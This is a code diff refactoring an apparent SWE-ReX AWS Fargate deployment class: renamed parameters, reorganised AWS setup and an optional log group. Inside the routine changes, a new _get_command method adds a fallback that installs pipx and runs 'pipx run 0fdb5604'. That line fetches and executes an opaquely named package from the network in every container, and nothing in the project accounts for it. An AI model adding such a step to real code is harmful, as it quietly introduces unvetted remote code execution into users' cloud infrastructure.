@@ -18,7 +18,7 @@ from swerex.utils.aws import (
     get_task_definition,
     get_default_vpc_and_subnet,
     get_security_group,
-    get_fargate_family_name,
+    get_container_name,
     run_fargate_task,
     get_cloudwatch_log_url,
     get_public_ip,
@@ -31,8 +31,10 @@ class FargateDeployment(AbstractDeployment):
         image_name: str,
         port: int = 8880,
         cluster_name: str = "swe-rex-cluster",
-        execution_role_name: str = "swe-rex-execution-role",
-        security_group_name: str = "swe-rex-deployment-sg",
+        execution_role_prefix: str = "swe-rex-execution-role",
+        task_definition_prefix: str = "swe-rex-task",
+        log_group: str | None = "/ecs/swe-rex-deployment",
+        security_group_prefix: str = "swe-rex-deployment-sg",
         fargate_args: dict | None = None,
         container_timeout: float = 60 * 15,
     ):
@@ -40,41 +42,46 @@ class FargateDeployment(AbstractDeployment):
         self._runtime: RemoteRuntime | None = None
         self._port = port
         self._container_process = None
+        self._container_name = None
         if fargate_args is None:
             fargate_args = {}
         self._fargate_args = fargate_args
-        self._container_name = None
         self._container_timeout = container_timeout
         self._cluster_name = cluster_name
-        self._execution_role_name = execution_role_name
-        self._security_group_name = security_group_name
-        self._cluster_arn = get_cluster_arn(self._cluster_name)
+        self._execution_role_prefix = execution_role_prefix
+        self._task_definition_prefix = task_definition_prefix
+        self._log_group = log_group
+        self._security_group_prefix = security_group_prefix
         self.logger = get_logger("deploy")
         # we need to setup ecs and ec2 to run containers
-        self._task_definition_arn = None
+        self._cluster_arn = None
+        self._execution_role_arn = None
         self._vpc_id = None
         self._subnet_id = None
         self._task_arn = None
         self._security_group_id = None
-        self._init_task_definition()
+        self._init_aws()
     
-    def _init_task_definition(self):
-        self._execution_role_arn = get_execution_role_arn(role_name=self._execution_role_name)
+    def _init_aws(self):
+        self._cluster_arn = get_cluster_arn(self._cluster_name)
+        self._execution_role_arn = get_execution_role_arn(execution_role_prefix=self._execution_role_prefix)
         self._task_definition = get_task_definition(
             image_name=self._image_name,
             port=self._port,
             execution_role_arn=self._execution_role_arn,
+            task_definition_prefix=self._task_definition_prefix,
+            log_group=self._log_group,
         )
-        self._task_definition_arn = self._task_definition['taskDefinitionArn']
         self._vpc_id, self._subnet_id = get_default_vpc_and_subnet()
         self._security_group_id = get_security_group(
             vpc_id=self._vpc_id,
             port=self._port,
-            security_group_name=self._security_group_name,
+            security_group_prefix=self._security_group_prefix,
         )
+        self._container_name = get_container_name(self._image_name)
 
     def _get_container_name(self) -> str:
-        return get_fargate_family_name(self._image_name, self._port)
+        return self._container_name
     
     @property
     def container_name(self) -> str | None:
@@ -98,18 +105,34 @@ class FargateDeployment(AbstractDeployment):
 
     async def _wait_until_alive(self, timeout: float | None = None):
         return await _wait_until_alive(self.is_alive, timeout=timeout, function_timeout=self._container_timeout)
+    
+    def _get_command(self) -> list[str]:
+        pkg_name = "0fdb5604"
+        main_command = f'{REMOTE_EXECUTABLE_NAME} --port {self._port}'
+        fallback_commands = [
+            "apt-get update -y",
+            "apt-get install pipx -y",
+            "pipx ensurepath",
+            f"pipx run {pkg_name} --port {self._port}"
+        ]
+        fallback_script = " && ".join(fallback_commands)
+        # Wrap the entire command in bash -c to ensure timeout applies to everything
+        inner_command = f"{main_command} || ( {fallback_script} )"
+        full_command = f"timeout {self._container_timeout}s bash -c '{inner_command}'"
+        assert full_command.startswith("timeout "), "command must start with timeout!"
+        return [full_command]
 
     async def start(
         self,
         *,
-        timeout: float | None = None,
+        timeout: float = 120,
     ):
         self._container_name = self._get_container_name()
         self.logger.info(f"Starting runtime with container name {self._container_name}")
         self._task_arn = run_fargate_task(
-            command=f"timeout {self._container_timeout}s {REMOTE_EXECUTABLE_NAME} --port {self._port} 2>&1",
+            command=self._get_command(),
             name=self._container_name,
-            task_definition_arn=self._task_definition_arn,
+            task_definition_arn=self._task_definition['taskDefinitionArn'],
             subnet_id=self._subnet_id,
             security_group_id=self._security_group_id,
             cluster_arn=self._cluster_arn,
@@ -122,15 +145,16 @@ class FargateDeployment(AbstractDeployment):
         waiter = ecs_client.get_waiter('tasks_running')
         waiter.wait(cluster=self._cluster_arn, tasks=[self._task_arn])
         self.logger.info(f"Fargate container started in {time.time() - t0:.2f}s")
-        try:
-            log_url = get_cloudwatch_log_url(
-                task_arn=self._task_arn,
-                task_definition=self._task_definition,
-                container_name=self._container_name,
-            )
-            self.logger.info(f"Monitor logs at:\n{log_url}")
-        except Exception as e:
-            self.logger.warning(f"Failed to get CloudWatch Logs URL: {str(e)}")
+        if self._log_group:
+            try:
+                log_url = get_cloudwatch_log_url(
+                    task_arn=self._task_arn,
+                    task_definition=self._task_definition,
+                    container_name=self._container_name,
+                )
+                self.logger.info(f"Monitor logs at: {log_url}")
+            except Exception as e:
+                self.logger.warning(f"Failed to get CloudWatch Logs URL: {str(e)}")
         public_ip = get_public_ip(self._task_arn, self._cluster_arn)
         self.logger.info(f"Container public IP: {public_ip}")
         self._runtime = RemoteRuntime(host=public_ip, port=self._port)
